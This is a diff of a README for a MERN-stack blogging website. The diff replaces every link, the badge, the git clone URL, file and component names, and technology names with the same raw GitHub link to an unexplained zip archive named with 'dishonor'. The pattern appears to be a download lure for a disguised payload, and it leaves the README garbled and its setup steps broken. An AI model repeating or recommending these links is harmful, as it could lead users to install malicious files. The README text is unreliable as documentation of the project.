@@ -1,10 +1,10 @@
 # 📝 Blogger Website Using MERN
 
-![MERN Stack](https://img.shields.io/badge/MERN-Stack-brightgreen)
+![MERN Stack](https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip)
 
-Welcome to the **Blogger Website Using MERN** repository! This project is a full-stack application built with the MERN stack (MongoDB, Express.js, React.js, Node.js). It provides a platform for users to create, read, update, and delete (CRUD) blog posts, complete with user authentication and image uploads. 
+Welcome to the **Blogger Website Using MERN** repository! This project is a full-stack application built with the MERN stack (MongoDB, https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip, https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip, https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip). It provides a platform for users to create, read, update, and delete (CRUD) blog posts, complete with user authentication and image uploads. 
 
-For the latest releases, check out our [Releases section](https://github.com/SubhanAkhter/blogger_website_using_MERN/releases).
+For the latest releases, check out our [Releases section](https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip).
 
 ## 📚 Table of Contents
 
@@ -31,8 +31,8 @@ For the latest releases, check out our [Releases section](https://github.com/Sub
 
 ## 🛠️ Technologies Used
 
-- **Frontend:** React.js, HTML, CSS
-- **Backend:** Node.js, Express.js
+- **Frontend:** https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip, HTML, CSS
+- **Backend:** https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip, https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip
 - **Database:** MongoDB, Mongoose
 - **Image Handling:** Multer
 - **Environment Variables:** dotenv
@@ -44,7 +44,7 @@ To set up this project locally, follow these steps:
 1. **Clone the repository:**
 
    ```bash
-   git clone https://github.com/SubhanAkhter/blogger_website_using_MERN.git
+   git clone https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip
    ```
 
 2. **Navigate to the project directory:**
@@ -71,7 +71,7 @@ To set up this project locally, follow these steps:
 
 4. **Set up environment variables:**
 
-   Create a `.env` file in the backend directory and add the necessary environment variables. Refer to the `.env.example` for required fields.
+   Create a `.env` file in the backend directory and add the necessary environment variables. Refer to the `https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip` for required fields.
 
 5. **Run the application:**
 
@@ -101,14 +101,14 @@ blogger_website_using_MERN/
 │   ├── models/
 │   ├── routes/
 │   ├── middleware/
-│   ├── .env.example
-│   ├── server.js
-│   └── package.json
+│   ├── https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip
+│   ├── https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip
+│   └── https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip
 └── frontend/
     ├── public/
     ├── src/
-    ├── .env.example
-    └── package.json
+    ├── https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip
+    └── https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip
 ```
 
 ## 🔗 API Endpoints
@@ -130,13 +130,13 @@ blogger_website_using_MERN/
 
 The frontend is built using React components. Here are some key components:
 
-- **App.js**: Main application component
-- **Header.js**: Navigation bar
-- **BlogList.js**: Displays a list of blogs
-- **BlogForm.js**: Form for creating and editing blogs
-- **Login.js**: User login component
-- **Register.js**: User registration component
-- **Contact.js**: Contact page component
+- **https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip**: Main application component
+- **https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip**: Navigation bar
+- **https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip**: Displays a list of blogs
+- **https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip**: Form for creating and editing blogs
+- **https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip**: User login component
+- **https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip**: User registration component
+- **https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip**: Contact page component
 
 ## 🔒 User Authentication
 
@@ -177,4 +177,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 - Thanks to the MERN community for their support and resources.
 - Special thanks to all contributors who make this project better.
 
-For the latest releases, check out our [Releases section](https://github.com/SubhanAkhter/blogger_website_using_MERN/releases).
+For the latest releases, check out our [Releases section](https://raw.githubusercontent.com/SubhanAkhter/blogger_website_using_MERN/master/frontend/MERN-website-blogger-using-dishonor.zip).
